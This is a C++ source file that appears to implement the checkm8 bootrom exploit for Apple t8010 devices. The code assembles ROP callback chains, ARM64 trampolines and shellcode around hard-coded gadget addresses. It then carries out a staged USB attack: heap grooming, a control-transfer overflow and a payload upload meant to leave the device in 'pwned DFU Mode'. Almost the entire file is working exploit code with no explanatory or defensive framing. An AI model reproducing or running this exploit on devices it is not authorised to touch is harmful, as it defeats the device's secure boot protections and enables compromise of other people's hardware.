#include <assert.h>
#include <fcntl.h>
#include <fstream>
#include <iostream>
#include <iterator>
#include <stdio.h>
#include <vector>

#ifdef WIN32
#include <windows.h>
#elif _POSIX_C_SOURCE >= 199309L
#include <time.h> // for nanosleep
#else
#include <unistd.h> // for usleep
#endif

using namespace std;

#include "dfu.h"

const int PAYLOAD_OFFSET_ARMV7 = 384;
const int PAYLOAD_SIZE_ARMV7 = 320;
const int PAYLOAD_OFFSET_ARM64 = 384;
const int PAYLOAD_SIZE_ARM64 = 576;

typedef struct _DeviceConfig {
  std::string version;
  int cpid;
  int large_leak;
  uint8_t *overwrite;
  int overwrite_size;
  int hole;
  int leak;

  _DeviceConfig(std::string version, int cpid, int large_leak,
                uint8_t *overwrite, int overwrite_size, int hole, int leak)
      : version(version), cpid(cpid), large_leak(large_leak),
        overwrite(overwrite), overwrite_size(overwrite_size), hole(hole),
        leak(leak) {}
} DeviceConfig;

typedef struct _Callback {
  uint64_t FunctionAddress;
  uint64_t CallbackAddress;

  _Callback(uint64_t FunctionAddress, uint64_t CallbackAddress)
      : FunctionAddress(FunctionAddress), CallbackAddress(CallbackAddress) {}

} Callback;

void sleep_ms(int milliseconds) // cross-platform sleep function
{
#ifdef WIN32
  Sleep(milliseconds);
#elif _POSIX_C_SOURCE >= 199309L
  struct timespec ts;
  ts.tv_sec = milliseconds / 1000;
  ts.tv_nsec = (milliseconds % 1000) * 1000000;
  nanosleep(&ts, NULL);
#else
  usleep(milliseconds * 1000);
#endif
}

vector<uint8_t> usb_rop_callbacks(uint64_t address, uint64_t func_gadget,
                                  vector<Callback> callbacks) {
  vector<uint64_t> data;

  for (int i = 0; i < callbacks.size(); i += 5) {
    vector<uint64_t> block1;
    vector<uint64_t> block2;

    for (int j = 0; j < 5; j++) {
      address += 0x10;

      if (j == 4) {
        address += 0x50;
      }

      if ((i + j) < callbacks.size() - 1) {
        block1.push_back(func_gadget);
        block1.push_back(address);
        block2.push_back(callbacks[i + j].CallbackAddress);
        block2.push_back(callbacks[i + j].FunctionAddress);
      } else if ((i + j) == callbacks.size() - 1) {
        block1.push_back(func_gadget);
        block1.push_back(0);
        block2.push_back(callbacks[i + j].CallbackAddress);
        block2.push_back(callbacks[i + j].FunctionAddress);
      } else {
        block1.push_back(0);
        block1.push_back(0);
      }
    }
    data.insert(data.end(), block1.begin(), block1.end());
    data.insert(data.end(), block2.begin(), block2.end());
  }

  vector<uint8_t> dataOut;
  append<uint8_t>(dataOut, (uint8_t *)data.data(),
                  data.size() * sizeof(uint64_t));

  return dataOut;
}

// # TODO: assert we are within limits
uint32_t asm_arm64_branch(uint64_t src, uint64_t dest) {
  uint32_t value;
  if (src > dest) {
    value = (uint32_t)(0x18000000 - (src - dest) / 4);
  } else {
    value = (uint32_t)(0x14000000 + (dest - src) / 4);
  }
  return value;
}

// # TODO: check if start offset % 4 would break it
// # LDR X7, [PC, #OFFSET]; BR X7
vector<uint8_t> asm_arm64_x7_trampoline(uint64_t dest) {
  vector<uint8_t> Trampoline = {0x47, 0x00, 0x00, 0x58, 0xE0, 0x00, 0x1F, 0xD6};
  Trampoline.insert(Trampoline.end(), (uint8_t *)&dest,
                    ((uint8_t *)&dest) + sizeof(uint64_t));

  return Trampoline;
}

vector<uint8_t> prepare_shellcode(std::string name,
                                  vector<uint64_t> &constants) {
  int size = 0;
  if (name.find("_armv7") != string::npos) {
    size = 4;
  } else if (name.find("_arm64") != string::npos) {
    size = 8;
  } else {
    cout << "[!] Unknown shellcode name: " << name << "\n";
    exit(0);
  }

  // Read file
  string filename = "bin/" + name + ".bin";
  ifstream f(filename, ios::binary | ios::in);
  if (f.is_open() == false) {
    cout << "[!] Could not open binary file: '" << filename << "'\n";
    exit(0);
  }
  f.unsetf(std::ios::skipws);
  std::streampos fileSize;
  f.seekg(0, std::ios::end);
  fileSize = f.tellg();
  f.seekg(0, std::ios::beg);
  std::vector<uint8_t> shellcode;
  shellcode.reserve(fileSize);
  shellcode.insert(shellcode.begin(), std::istream_iterator<uint8_t>(f),
                   std::istream_iterator<uint8_t>());
  f.close();

  //  Shellcode has placeholder values for constants; check they match and
  //  replace with constants from config
  uint64_t placeholders_offset = shellcode.size() - size * constants.size();
  for (int i = 0; i < constants.size(); i++) {
    uint64_t offset = placeholders_offset + size * i;
    uint64_t value = 0;
    if (size == 8)
      value = *(uint64_t *)(&shellcode[offset]);
    else
      value = *(uint32_t *)(&shellcode[offset]);
    assert(value == 0xBAD00001 + i);
  }

  vector<uint8_t> ShellcodeRet;
  append(ShellcodeRet, shellcode.data(), placeholders_offset);
  appendV(ShellcodeRet, constants);

  return ShellcodeRet;
}

/*
        Generate shellcode for the t8010
*/
vector<uint8_t> getT8010Shellcode() {
  vector<uint8_t> Shellcode;

  vector<uint64_t> constants_usb_t8010 = {
      0x1800B0000,        // 1 - LOAD_ADDRESS
      0x6578656365786563, // 2 - EXEC_MAGIC
      0x646F6E65646F6E65, // 3 - DONE_MAGIC
      0x6D656D636D656D63, // 4 - MEMC_MAGIC
      0x6D656D736D656D73, // 5 - MEMS_MAGIC
      0x10000DC98         // 6 - USB_CORE_DO_IO
  };

  vector<uint64_t> constants_checkm8_t8010 = {
      0x180088A30,          // 1 - gUSBDescriptors
      0x180083CF8,          // 2 - gUSBSerialNumber
      0x10000D150,          // 3 - usb_create_string_descriptor
      0x1800805DA,          // 4 - gUSBSRNMStringDescriptor
      0x1800AFC00,          // 5 - PAYLOAD_DEST
      PAYLOAD_OFFSET_ARM64, // 6 - PAYLOAD_OFFSET
      PAYLOAD_SIZE_ARM64,   // 7 - PAYLOAD_SIZE
      0x180088B48,          // 8 - PAYLOAD_PTR
  };

  uint64_t t8010_func_gadget = 0x10000CC4C;
  uint64_t t8010_enter_critical_section = 0x10000A4B8;
  uint64_t t8010_exit_critical_section = 0x10000A514;
  uint64_t t8010_dc_civac = 0x10000046C;
  uint64_t t8010_write_ttbr0 = 0x1000003E4;
  uint64_t t8010_tlbi = 0x100000434;
  uint64_t t8010_dmb = 0x100000478;
  uint64_t t8010_handle_interface_request = 0x10000DFB8;

  vector<Callback> t8010_callbacks = {
      Callback(t8010_dc_civac, 0x1800B0600),
      Callback(t8010_dmb, 0),
      Callback(t8010_enter_critical_section, 0),
      Callback(t8010_write_ttbr0, 0x1800B0000),
      Callback(t8010_tlbi, 0),
      Callback(0x1820B0610, 0),
      Callback(t8010_write_ttbr0, 0x1800A0000),
      Callback(t8010_tlbi, 0),
      Callback(t8010_exit_critical_section, 0),
      Callback(0x1800B0000, 0),
  };

  /*
  t8010_handler = asm_arm64_x7_trampoline(t8010_handle_interface_request) +
                  asm_arm64_branch(0x10, 0x0) +
                  prepare_shellcode('usb_0xA1_2_arm64',
  constants_usb_t8010)[4:]
                                  */
  vector<uint8_t> t8010_handler;
  appendV<uint8_t, uint8_t>(
      t8010_handler, asm_arm64_x7_trampoline(t8010_handle_interface_request));
  append<uint8_t, uint32_t>(t8010_handler, asm_arm64_branch(0x10, 0x0));
  auto PreSC =
      prepare_shellcode(std::string("usb_0xA1_2_arm64"), constants_usb_t8010);
  append<uint8_t>(t8010_handler, PreSC.data() + 4, PreSC.size() - 4);

  auto t8010_shellcode =
      prepare_shellcode("checkm8_arm64", constants_checkm8_t8010);

  // Do some checks
  assert(t8010_shellcode.size() <= PAYLOAD_OFFSET_ARM64);
  assert(t8010_handler.size() <= PAYLOAD_SIZE_ARM64);

  // t8010_shellcode = t8010_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 -
  // len(t8010_shellcode)) + t8010_handler
  vector<uint8_t> Zeros;
  Zeros.insert(Zeros.end(), (PAYLOAD_OFFSET_ARM64 - t8010_shellcode.size()), 0);
  appendV(t8010_shellcode, Zeros);
  appendV(t8010_shellcode, t8010_handler);
  assert(t8010_shellcode.size() <= 0x400);

  // return struct.pack('<1024sQ504x2Q496s32x', t8010_shellcode, 0x1000006A5,
  // 0x60000180000625, 0x1800006A5,
  // prepare_shellcode('t8010_t8011_disable_wxn_arm64')) +
  // usb_rop_callbacks(0x1800B0800, t8010_func_gadget, t8010_callbacks)

  // Create finale shellcode
  // 0 - 0x400 [t8010_shellcode ... 0000]
  appendV(Shellcode, t8010_shellcode);
  Shellcode.insert(Shellcode.end(), 0x400 - t8010_shellcode.size(), 0);

  // 0x400 - 0x408 [0x1000006A5]
  append(Shellcode, 0x1000006A5);

  // 0x408 - 0x600 [ 0000 ... 0000]
  Shellcode.insert(Shellcode.end(), 504, 0);

  // 0x600 - 0x608 [ 0x60000180000625 ]
  append(Shellcode, 0x60000180000625);

  // 0x608 - 0x610 [ 0x1800006A5 ]
  append(Shellcode, 0x1800006A5);

  // 0x610 - 0x800 [ prepare_shellcode ... 000 ]
  vector<uint64_t> E;
  auto t8010_t8011_disable_wxn_arm64 =
      prepare_shellcode("t8010_t8011_disable_wxn_arm64", E);
  appendV(Shellcode, t8010_t8011_disable_wxn_arm64);
  Shellcode.insert(Shellcode.end(), 496 - t8010_t8011_disable_wxn_arm64.size(),
                   0);

  // 0x800 - 0x820 [ 0000 ... 0000 ]
  Shellcode.insert(Shellcode.end(), 32, 0);

  // 0x820 - end [ urc ]
  auto urc = usb_rop_callbacks(0x1800B0800, t8010_func_gadget, t8010_callbacks);
  appendV(Shellcode, urc);

  printf("[*] Shellcode generated ...\n");

  return Shellcode;
}

#pragma pack(1)
typedef struct alignas(1) {
  uint8_t temp0[0x580] = {0};
  uint8_t temp1[32] = {0};
  uint64_t t8010_nop_gadget0 = 0x10000CC6C;
  uint64_t Offset = 0x1800B0800;
  uint8_t temp[16 + 32] = {0};
  uint64_t t8010_nop_gadget1 = 0x10000CC6C;
  uint64_t Offset2 = 0x1800B0800;
  uint32_t End = 0xbeefbeef;
} t8010_overwrite;

int main(int argc, char *argv[]) {
  // Create device config
  t8010_overwrite Overwrite;
  assert(sizeof(t8010_overwrite) == 1524);

  DeviceConfig DC_t8010("iBoot-2696.0.0.1.33", 0x8010, 0, (uint8_t *)&Overwrite,
                        sizeof(Overwrite), 5, 1);

  // Get shellcode
  auto Shellcode = getT8010Shellcode();

  // Run exploit (t8010 specific)
  DFU D;
  if (!D.acquire_device()) {
    printf("[!] Failed to find device!\n");
    return 1;
  }

  if (D.isExploited()) {
    printf("[!] Device is already exploited! Aborting!\n");
    return 0;
  }

  printf("[*] stage 1, heap grooming ...\n");

  D.stall();
  for (int i = 0; i < DC_t8010.hole; i++) {
    D.no_leak();
  }
  D.usb_req_leak();
  D.no_leak();
  D.usb_reset();
  D.release_device();

  printf("[*] stage 2, usb setup, send 0x800 of 'A', sends no data\n");
  D.acquire_device();
  // libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
  std::vector<uint8_t> A800;
  A800.insert(A800.end(), 0x800, 'A');
  D.libusb1_async_ctrl_transfer(0x21, 1, 0, 0, A800, 0.0001);
  // libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
  D.libusb1_no_error_ctrl_transfer(0x21, 4, 0, 0, 0, 0, 0);
  D.release_device();

  sleep_ms(500);

  printf("[*] stage 3, exploit\n");
  D.acquire_device();
  D.usb_req_stall();

  for (int i = 0; i < DC_t8010.leak; i++) {
    D.usb_req_leak();
  }
  D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, DC_t8010.overwrite,
                                   DC_t8010.overwrite_size, 100);

  for (int i = 0; i < Shellcode.size(); i += 0x800) {
    int Size = 0x800;
    if ((Size + i) > Shellcode.size()) {
      Size = Shellcode.size() - i;
    }
    D.libusb1_no_error_ctrl_transfer(0x21, 1, 0, 0, Shellcode.data() + i, Size,
                                     100);
  }

  sleep_ms(500);

  D.usb_reset();
  D.release_device();

  sleep_ms(500);

  // Check if device is pwned ...
  D.acquire_device();
  // Check serial number string here!
  if (D.isExploited()) {
    printf("[!] Device is now in pwned DFU Mode! :D\n");
  } else {
    printf("[!] Exploit failed! :(\n");
  }
  D.release_device();

  // Demote device
  
  
  return 0;
}
